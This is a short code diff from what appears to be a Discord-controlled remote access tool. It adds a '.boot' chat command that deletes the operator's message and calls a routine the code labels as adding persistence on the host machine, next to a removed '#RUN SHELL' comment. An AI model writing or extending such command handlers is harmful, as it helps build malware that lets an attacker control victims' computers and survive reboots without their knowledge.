@@ -282,7 +282,15 @@ async def on_message(message):
             embed = discord.Embed(title="Modules", description="Invalid argument.", color=0x00ff00)
             await message.channel.send(embed=embed)
 
-    #RUN SHELL
+    #PERSISTENCE
+    if message.content.startswith(".boot"):
+        await message.delete()
+        try:
+            pc.bootup()
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Bootup", description="Failed to add persistence.", color=0x00ff00)
+            return
 
 token = sys.argv[1]
 client.run(token)
